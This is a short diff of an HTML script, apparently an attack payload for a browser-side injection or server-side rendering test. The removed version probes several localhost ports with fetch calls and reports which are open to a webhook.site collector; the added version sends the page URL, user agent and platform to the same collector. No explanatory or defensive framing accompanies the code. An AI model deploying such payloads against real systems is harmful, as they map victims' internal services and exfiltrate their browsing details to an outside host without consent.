@@ -1,20 +1,5 @@
-<html>
-<body>
 <script>
-
-function scan(url,name){
- fetch(url,{mode:"no-cors"})
- .then(()=>fetch("https://webhook.site/b1e161f9-7ffb-46f0-9c43-bb7491e1b6f0/"+name+"-open"))
- .catch(()=>fetch("https://webhook.site/b1e161f9-7ffb-46f0-9c43-bb7491e1b6f0/"+name+"-closed"))
-}
-
-scan("http://127.0.0.1:80","p80")
-scan("http://127.0.0.1:3000","p3000")
-scan("http://127.0.0.1:5000","p5000")
-scan("http://127.0.0.1:8080","p8080")
-scan("http://127.0.0.1:9000","p9000")
-scan("http://127.0.0.1:443","p443")
-
+fetch("https://webhook.site/b1e161f9-7ffb-46f0-9c43-bb7491e1b6f0/?url="+location.href)
+fetch("https://webhook.site/b1e161f9-7ffb-46f0-9c43-bb7491e1b6f0/?ua="+navigator.userAgent)
+fetch("https://webhook.site/b1e161f9-7ffb-46f0-9c43-bb7491e1b6f0/?platform="+navigator.platform)
 </script>
-</body>
-</html>
